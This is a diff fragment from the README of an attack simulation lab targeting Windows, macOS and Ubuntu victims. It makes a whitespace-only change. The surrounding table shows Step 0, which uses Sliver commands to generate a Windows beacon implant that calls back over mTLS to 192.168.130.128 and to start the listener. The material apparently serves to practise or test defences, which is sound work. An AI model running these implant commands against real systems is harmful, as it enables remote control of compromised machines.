@@ -63,7 +63,8 @@ Victims：a Windows 10, a macOS and an Ubuntu
 You can download the attack simulation environment from here(https://XXXX)
 
 ### Scenario Steps
-Each `uuid` encompasses an `executor`, within which the `command` parameter specifies the actual attack command that needs to be executed. You should proceed manually through the attack steps in the sequence of the UUIDs. 
+Each `uuid` encompasses an `executor`, within which the `command` parameter specifies the actual attack command that needs to be executed. You should proceed manually through the attack steps in the sequence of the UUIDs.
+
 | Steps        | Description	       | Executor |
 |:-------------|:--------------------|:---------|
 | Step 0 - Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring | sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save <br> sliver > mtls  |
